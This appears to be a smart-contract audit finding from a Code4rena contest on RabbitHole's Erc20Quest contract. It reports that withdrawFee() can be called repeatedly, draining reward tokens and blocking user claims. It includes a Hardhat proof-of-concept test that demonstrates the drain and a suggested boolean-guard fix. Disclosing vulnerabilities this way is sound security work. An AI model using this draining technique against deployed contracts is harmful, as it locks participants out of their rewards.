# Protocol fee could be withdraw multiple times by anyone
## Lines of code
https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/Erc20Quest.sol#L102

## Vulnerability details
## Impact
The ERC20 quest protocol fee can be repeatedly withdrawn. Although the fee recipient's address is immutable and fees protected from theft, the lack of access control in the `withdrawFee()` function means that anyone can call it multiple times, potentially causing damage to the claim process.

## Proof of Concept
The `Erc20Quest` contract has the ability to account protocol fees based on the number of participants in a quest. There is a `withdrawFee()` function for transferring these fees to a recipient address, which is immutable and set in the constructor.

```solidity
File: Erc20Quest.sol

100:     /// @notice Sends the protocol fee to the protocolFeeRecipient
101:     /// @dev Only callable when the quest is ended
102:     function withdrawFee() public onlyAdminWithdrawAfterEnd { 
103:         IERC20(rewardToken).safeTransfer(protocolFeeRecipient, protocolFee());
104:     }
```
The "withdrawFee()" function lacks proper checks to ensure that the fee has not already been withdrawn, and also lacks access control. This creates a potential vulnerability where a malicious actor could repeatedly call the function, leading to a reduced token balance in the contract and potentially disrupting the claim functionality.

Following test shows how multiple withdraw bleaks claim process:

quest-protocol/test/Erc20Quest.spec.ts
```solidity
  describe('withdrawFee() multiple times', async () => {
    it.only('Could transfer protocol fees back to owner multiple times', async () => {
      const beginningContractBalance = await deployedSampleErc20Contract.balanceOf(deployedQuestContract.address)

      await deployedFactoryContract.connect(firstAddress).mintReceipt(questId, messageHash, signature)
      await deployedQuestContract.start()
      await ethers.provider.send('evm_increaseTime', [86400])
      expect(await deployedSampleErc20Contract.balanceOf(protocolFeeAddress)).to.equal(0)

      expect(await deployedQuestContract.protocolFee()).to.equal(200)
      expect(await deployedSampleErc20Contract.balanceOf(deployedQuestContract.address)).to.equal(
        totalRewardsPlusFee * 100
      )
      await ethers.provider.send('evm_increaseTime', [100001])
      for (var i = 0; i < totalParticipants * 6 * 100; i++) {
        await deployedQuestContract.withdrawFee()
      }
      expect(await deployedSampleErc20Contract.balanceOf(deployedQuestContract.address)).to.equal(0)
      await expect(deployedQuestContract.connect(firstAddress).claim()).to.be.revertedWith(
        'ERC20: transfer amount exceeds balance'
      )

      await ethers.provider.send('evm_increaseTime', [-100001])
      await ethers.provider.send('evm_increaseTime', [-86400])
    })
  })
```
## Recommended Mitigation Steps
Consider adding a boolean variable that tracks the status of the protocol fee and check it in "withdrawFee()" function:
```solidity
    function withdrawFee() public onlyAdminWithdrawAfterEnd { 
        require(!feeWithdrawn, "Fee has already been withdrawn.");
        feeWithdrawn = true;
        IERC20(rewardToken).safeTransfer(protocolFeeRecipient, protocolFee());
    }
```
## Link to origin issue
https://github.com/code-423n4/2023-01-rabbithole-findings/issues/473